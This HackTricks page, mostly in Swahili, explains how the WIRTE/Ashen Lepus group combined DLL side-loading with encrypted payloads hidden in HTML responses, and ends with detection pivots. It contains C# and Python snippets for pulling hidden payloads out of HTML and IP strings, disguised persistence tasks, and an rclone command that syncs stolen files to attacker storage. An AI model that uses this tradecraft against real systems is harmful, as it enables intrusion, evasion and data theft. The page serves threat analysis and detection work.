# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari wa Tradecraft

Ashen Lepus (pia hujulikana kama WIRTE) aliweka silaha kwenye muundo unaoweza kurudiwa unaounganisha DLL sideloading, HTML payloads zilizowekwa kwa hatua, na .NET backdoors za moduli ili kudumu ndani ya mitandao ya kidiplomasia ya Mashariki ya Kati. Mbinu hii inaweza kutumiwa tena na operator yeyote kwa sababu inategemea:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: PDFs zisizo na madhara huwaelekeza targets kupakua RAR archive kutoka kwenye file-sharing site. Archive hiyo hujumuisha document viewer EXE inayoonekana halisi, DLL hasidi iliyopewa jina la library inayoaminika (kwa mfano, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na decoy `Document.pdf`.
- **DLL search order abuse**: victim hubofya EXE mara mbili, Windows hutatua DLL import kutoka current directory, na malicious loader (AshenLoader) hutekelezwa ndani ya trusted process huku decoy PDF ikifunguka ili kuzuia mashaka.
- **Living-off-the-land staging**: kila stage inayofuata (AshenStager → AshenOrchestrator → modules) huhifadhiwa nje ya disk hadi ihitajike, na kuwasilishwa kama encrypted blobs zilizofichwa ndani ya HTML responses zinazoonekana kuwa zisizo na madhara.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE husideload AshenLoader, ambayo hufanya host recon, hui-encrypt kwa AES-CTR, na kui-POST ndani ya parameters zinazobadilika kama `token=`, `id=`, `q=`, au `auth=` kwenda kwenye API-looking paths (kwa mfano, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2 hufichua stage inayofuata tu wakati client IP ingeolocate kwenye target region na `User-Agent` ilingane na implant, hivyo kuvuruga sandboxes. Checks zinapofaulu, HTTP body huwa na blob ya `<headerp>...</headerp>` iliyo na AshenStager payload iliyosimbwa kwa Base64/AES-CTR.
3. **Second sideload**: AshenStager hu-deployiwa pamoja na legitimate binary nyingine inayo-import `wtsapi32.dll`. Malicious copy iliyo-injectiwa kwenye binary hiyo hufetch HTML zaidi, wakati huu ikichanganua `<article>...</article>` ili kurejesha AshenOrchestrator.
4. **AshenOrchestrator**: .NET controller ya moduli inayodecode Base64 JSON config. Fields `tg` na `au` za config huunganishwa na ku-hash kuwa AES key, ambayo hu-decrypt `xrk`. Bytes zitakazopatikana hutumika kama XOR key kwa kila module blob inayofetchiwa baadaye.
5. **Module delivery**: kila module hufafanuliwa kupitia HTML comments zinazoelekeza parser kwenye arbitrary tag, na kuvunja static rules zinazoangalia `<headerp>` au `<article>` pekee. Modules zinajumuisha persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Hata kama watetezi watazuia au kuondoa element maalum, operator anahitaji tu kubadilisha tag iliyoonyeshwa kwenye HTML comment ili kuendelea na delivery.<sup>[[1]](#references)</sup>

### Msaidizi wa Haraka wa Utoaji (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Ufanano wa HTML Staging Evasion

Utafiti wa hivi karibuni kuhusu HTML smuggling (Talos) unaonyesha payloads zilizofichwa kama strings za Base64 ndani ya blocks za `<script>` katika HTML attachments na kufanyiwa decode na JavaScript wakati wa runtime.<sup>[[2]](#references)</sup> Ujanja huo unaweza kutumiwa tena kwa majibu ya C2: weka encrypted blobs ndani ya script tag (au DOM element nyingine) na uzifanyie decode kwenye memory kabla ya AES/XOR, hivyo kufanya ukurasa uonekane kama HTML ya kawaida. Talos pia inaonyesha layered obfuscation (kubadilisha majina ya identifiers pamoja na Base64/Caesar/AES) ndani ya script tags, jambo linalolingana vizuri na HTML-staged C2 blobs.<sup>[[2]](#references)</sup> Talos writeup ya baadaye kuhusu **hidden text salting** pia inahusika hapa: kugawanya Base64 kwa kutumia HTML comments au whitespace zisizo na umuhimu kunatosha kuvuruga regex extractors rahisi huku reconstruction ya upande wa browser ikiendelea kuwa rahisi.<sup>[[7]](#references)</sup>

## Maelezo ya Recent Variants (2024-2025)

- Check Point ilibaini kampeni za WIRTE mwaka 2024 ambazo bado zilitegemea archive-based sideloading, lakini zilitumia `propsys.dll` (stagerx64) kama first stage. Stager hufanya decode ya payload inayofuata kwa Base64 + XOR (key `53`), hutuma HTTP requests zenye `User-Agent` iliyowekwa moja kwa moja, na kutoa encrypted blobs zilizowekwa kati ya HTML tags. Katika branch moja, stage iliundwa upya kutoka kwenye list ndefu ya IP strings zilizowekwa ndani na kufanyiwa decode kwa `RtlIpv4StringToAddressA`, kisha kuunganishwa kuwa payload bytes.<sup>[[3]](#references)</sup>
- OWN-CERT iliandika kuhusu WIRTE tooling ya awali ambapo side-loaded `wtsapi32.dll` dropper ililinda strings kwa Base64 + TEA na kutumia jina la DLL yenyewe kama decryption key, kisha ikafanya XOR/Base64-obfuscation ya host identification data kabla ya kuituma kwa C2.<sup>[[4]](#references)</sup>

## Kuunda Upya IP-Encoded Stages

WIRTE `propsys.dll` branch ya 2024 inaonyesha kuwa PE inayofuata si lazima iwepo kama HTML blob moja iliyo contiguous. Loader inaweza kuhifadhi stage bytes kama dotted-quad strings na kuziunda upya kwa `RtlIpv4StringToAddressA`, ikiwa ni pattern inayohusiana kwa karibu na tradecraft ya Hive ya **IPfuscation**.<sup>[[3]](#references)[[5]](#references)</sup> Kiutendaji, hii ni muhimu wakati actor anapotaka HTML page iwe na vitu vinavyoonekana kama IOCs au config data zisizo na madhara badala ya Base64 payload iliyo wazi.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Ikiwa bytes zilizorejeshwa zinaanza na `MZ`, kuna uwezekano mkubwa kwamba umeunda upya PE inayofuata moja kwa moja. Ikiwa sivyo, angalia kama kuna layer ya XOR/Base64 mwanzoni au vipande vidogo vya delimiter kati ya anwani.

## Majina ya Swappable DLL na Rotation ya Host

Sifa muhimu ya pattern hii ni kwamba **HTML/AES/XOR staging backend inaweza kubaki ileile huku jozi ya sideload pekee ikibadilika**. WIRTE ilibadilisha kati ya `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, na `propsys.dll` katika campaigns, jambo ambalo ni muhimu kwa sababu:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` na `wtsapi32.dll` ni majina ya kawaida ya Windows DLL ambayo defenders wanatarajia kuwepo kwenye `%System32%` / `%SysWOW64%`.
- Public catalogs kama **HijackLibs** tayari zinaonyesha binaries nyingi zitakazopakia majina hayo ya DLL kutoka kwenye application directory iliyonakiliwa, hivyo kuwapa operators replacement hosts bila kuunda upya stager.
- Ni export surface pekee inayohitaji kubadilishwa kwa kila host. HTML parser, AES/XOR routines, na module loader kwa kawaida zinaweza kuhamishwa bila mabadiliko kwenye forwarding proxy DLL.

Kwa kazi za offensive lab, hii inamaanisha unaweza kugawanya tatizo katika **(1) kutafuta signed host thabiti inayotatua jina la DLL ulilochagua locally** na **(2) kutumia tena staged-HTML loader logic ileile nyuma ya DLL hiyo**.

## Crypto na C2 Hardening

- **AES-CTR kila mahali**: loaders za sasa zina embed keys za 256-bit pamoja na nonces (kwa mfano, `{9a 20 51 98 ...}`) na kwa hiari huongeza XOR layer kwa kutumia strings kama `msasn1.dll` kabla/baada ya decryption.<sup>[[1]](#references)</sup>
- **Mabadiliko ya key material**: loaders za awali zilitumia Base64 + TEA kulinda embedded strings, huku decryption key ikitokana na jina la malicious DLL (kwa mfano, `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**: staging servers hutenganishwa kwa kila tool, hu-hostiwa katika ASNs tofauti, na wakati mwingine huwekewa mbele subdomains zinazoonekana kuwa legitimate, hivyo kuunguza stage moja hakufichui nyingine.
- **Recon smuggling**: data iliyoorodheshwa sasa inajumuisha listings za Program Files ili kutambua apps zenye thamani kubwa na kila mara husimbwa kabla haijaondoka kwenye host.
- **URI churn**: query parameters na REST paths hubadilika kati ya campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), na hivyo kufanya detections zisizobadilika kuwa batili.
- **User-Agent pinning + safe redirects**: C2 infrastructure hujibu tu kwa UA strings sahihi kabisa; vinginevyo huelekeza kwenye news/health sites zisizo na madhara ili kuchanganyika na traffic ya kawaida.
- **Gated delivery**: servers huwekewa geo-fencing na hujibu implants halisi pekee. Clients ambazo hazijaidhinishwa hupokea HTML isiyo na mashaka.

## Persistence na Execution Loop

AshenStager huacha scheduled tasks zinazojifanya kuwa Windows maintenance jobs na hutekelezwa kupitia `svchost.exe`, kwa mfano:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Tasks hizi huanzisha tena sideloading chain wakati wa boot au kwa vipindi maalum, na kuhakikisha kuwa AshenOrchestrator inaweza kuomba modules mpya bila kugusa disk tena.

## Kutumia Benign Sync Clients kwa Exfiltration

Operators hu-stage diplomatic documents ndani ya `C:\Users\Public` (inayosomeka na kila mtu na isiyo na mashaka) kupitia dedicated module, kisha hupakua legitimate [Rclone](https://rclone.org/) binary ili kusync directory hiyo na attacker storage. Unit42 inasema hii ni mara ya kwanza actor huyu kuonekana akitumia Rclone kwa exfiltration, sambamba na trend pana ya kutumia vibaya legitimate sync tooling ili kuchanganyika na traffic ya kawaida:<sup>[[1]](#references)</sup>

1. **Stage**: nakili/kusanya target files ndani ya `C:\Users\Public\{campaign}\`.
2. **Configure**: tuma Rclone config inayoelekeza kwenye attacker-controlled HTTPS endpoint (kwa mfano, `api.technology-system[.]com`).
3. **Sync**: endesha `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ili traffic ifanane na normal cloud backups.

Kwa sababu Rclone hutumiwa sana kwa legitimate backup workflows, defenders lazima walenge executions zisizo za kawaida (binaries mpya, remotes zisizo za kawaida, au kusync ghafla `C:\Users\Public`).

## Detection Pivots

- Weka alert kwa **signed processes** zinazopakia DLLs bila kutarajiwa kutoka user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), hasa wakati majina ya DLL yanaingiliana na `netutils`, `srvcli`, `dwampi`, `wtsapi32`, au `propsys`.<sup>[[6]](#references)</sup>
- Kagua suspicious HTTPS responses kwa **large Base64 blobs zilizo-embed ndani ya unusual tags** au zilizolindwa na comments za `<!-- TAG: <xyz> -->`.
- Normalize HTML kwanza: **ondoa comments na collapse whitespace kabla ya Base64 extraction**, kwa sababu evasion ya mtindo wa hidden-text-salting inaweza kugawanya payloads katika comment boundaries.
- Panua HTML hunting hadi **Base64 strings zilizo ndani ya `<script>` blocks** (HTML smuggling-style staging) ambazo hu-decode kupitia JavaScript kabla ya AES/XOR processing.
- Hunt kwa calls zinazorudiwa za **`RtlIpv4StringToAddressA` zikifuatwa na buffer assembly**, hasa strings zinazozizunguka zinapokuwa long IPv4 lists badala ya network targets halisi.
- Hunt kwa **scheduled tasks** zinazoendesha `svchost.exe` zikiwa na non-service arguments au zinazoelekeza kwenye dropper directories.
- Fuatilia **C2 redirects** ambazo hurudisha payloads kwa exact `User-Agent` strings pekee na vinginevyo huelekeza kwenye legitimate news/health domains.
- Monitor **Rclone** binaries zinazoonekana nje ya locations zinazosimamiwa na IT, files mpya za `rclone.conf`, au sync jobs zinazovuta kutoka staging directories kama `C:\Users\Public`.

## References

- [1] [Ashen Lepus yenye uhusiano na Hamas inalenga mashirika ya kidiplomasia ya Mashariki ya Kati kwa kutumia New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Iliyofichwa kati ya tags: Maarifa kuhusu evasion techniques katika HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Threat Actor WIRTE yenye uhusiano na Hamas inaendelea na shughuli zake za Mashariki ya Kati na kuhamia kwenye disruptive activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Katika kutafuta muda uliopotea](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware inatumia Novel IPfuscation Technique ili kuepuka detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading kutoka Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Kuongeza hidden text salting kwenye email threats](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
